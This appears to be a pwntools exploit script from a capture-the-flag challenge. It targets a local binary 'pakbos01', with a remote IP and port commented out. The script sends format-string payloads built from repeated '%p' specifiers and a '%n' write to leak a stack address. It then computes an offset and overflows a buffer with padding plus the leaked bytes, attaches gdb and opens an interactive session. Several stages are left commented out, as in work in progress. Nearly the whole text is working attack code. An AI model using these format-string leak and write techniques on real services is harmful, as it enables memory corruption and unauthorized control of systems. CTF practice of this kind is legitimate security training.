from pwn import *

payload = [
("%p" * 13),
("A" * 24 + "@uUUU"),
("%p" * 8 + "%n"),
]


def chunks(s, n):
    for start in range(0, len(s), n):
        yield s[start:start+n]


def main():
    p = process("./pakbos01")
    # p = remote("3.0.19.78", 10001)

    p.recvuntil("password: ")

    print("--- Stage 0 ---")
    print(payload[0])
    p.sendline(payload[0])
    r = p.recvuntil("?")[:-1]
    log.info(r)
    r = r.split('x')[-1]
    r = int(r, 16)
    r = r + 2102971
    r = hex(r)[2:]
    r = list(chunks(r, 2))
    r = [chr(int(i, 16)) for i in r][::-1]
    log.info(r)
    p.recvuntil("password: ")

    print("--- Stage 1 ---")
    temp_payload = ("A" * 24 + "".join(r))
    log.info(temp_payload)
    p.sendline(temp_payload)
    r = p.recvuntil("?")[:-1]
    log.info("Aha: " + r)
    print(len(r), chr(len(r)))
    p.recvuntil("password: ")

    # print("--- Stage 2 ---")
    print(payload[2])
    p.sendline(payload[2])
    r = p.recvuntil("?")[:-1]
    log.info("Anu: " + r)
    print(len(r), chr(len(r)))
    print(p.recvuntil("password: "))

    gdb.attach(p, 'brva *0x80a')

    # print("--- Stage 3 ---")
    # p.sendline(chr(len(r)))
    p.interactive()


if __name__ == "__main__":
    main()